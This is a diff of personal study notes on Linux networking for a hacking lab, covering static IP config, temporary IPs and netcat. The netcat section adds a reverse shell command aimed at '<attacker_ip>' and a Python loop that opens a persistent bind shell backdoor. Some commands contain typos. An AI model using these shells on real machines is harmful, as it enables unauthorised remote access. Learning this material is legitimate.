@@ -269,11 +269,11 @@ ONBOOT=no
 
 - Even though the CentOS machine does not yet have an IP, its config file for eth0 still exists
 
-- Changes made for MiniHack:
-    - edit `BOOTPROTO=static`
-    - edit `ONBOOT=yes`
-    - add `IPADDR=<IP>`
-    - add `NETMASK=<netmask>`
+### Changes made for MiniHack:
+- edit `BOOTPROTO=static`
+- edit `ONBOOT=yes`
+- add `IPADDR=<IP>`
+- add `NETMASK=<netmask>`
 
 
 **Applying our network config changes**
@@ -284,7 +284,7 @@ ONBOOT=no
 
 
 
-# 19: Static network config in Ubuntu
+# 20: Static network config in Ubuntu
 
 Note that Ubuntu still has a `/etc/network/interfaces` file, but it is not used.
 
@@ -308,7 +308,7 @@ network:
             dhcp4: yes
 ```
 
-- Changes made for MiniHack
+### Changes made for MiniHack
 ```
 ...
     ethernets:
@@ -326,4 +326,66 @@ network:
 
 
 
-TODO: resume from vid #21
+# 22: Temporary IPs, permanent IPs, and flushing IPs
+
+### Temporary IPs with ip a
+
+Adding a temporary IP with `ip a`:
+`sudo ip a add 192.168.118.3/24 dev eth0`
+
+- Note that the above IP is temporary, and thus gets wiped after a restart
+    - This is why we learn network configs
+
+- Note on having 2 IPs on one interface: `ifconfig` will not detect both IPs, but `ip a` will
+
+
+### Flushing the network config (i.e. the IPs assigned to a network interface)
+
+`sudo ipddr flush dev ens18`
+
+- The above does not destroy your network config.
+
+
+
+
+
+## 23: Netcat (nc)
+
+[Watch the video](https://www.youtube.com/watch?v=_aIac8hweAg&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=23) if you are unfamiliar with what netcat actually is.
+
+### Nc vs. netcat vs. ncat
+
+There can be some well-justified confusion here.
+- For our purposes "nc" and "netcat" refer to the same binary.
+- "ncat", on the other hand, is the more feature-rich version of nc, created by the Nmap team.
+
+
+### Abusing netcat 🙀
+
+Netcat doesn't just allow you to send text back and forth between two hosts, you can __redirect the data that it receives to an application on the computer, e.g. /bin/bash__
+
+Example - Ncat reverse shell:
+(On compromised victim machine): `nc <attacker_ip> 54321 -e /bin/bash`
+(On attacker machine): nc `nc -lvnp 54321`
+
+After the above, the attacker should now have a shell (terminal access) on a vicitm computer (if the above command doesn't work, it may be because you are using a primitive verison of netcat such as nc, instead of ncat).
+
+
+### Creating a (crappy) persistent backdoor with Python
+
+```
+import os
+while True:
+    os.system("nc -l -p 54321 -e /bin/bash");'
+```
+
+* video says ctrl+Z "quits" the python while loop instead of backgrounding it?
+
+can anyone figure out how to one-line this?
+    - this does't work:`python -c 'import os; while True: os.system("nc -l -p 54321 -e /bin/bash");'`
+
+
+
+
+
+# 24: Web services with Apache
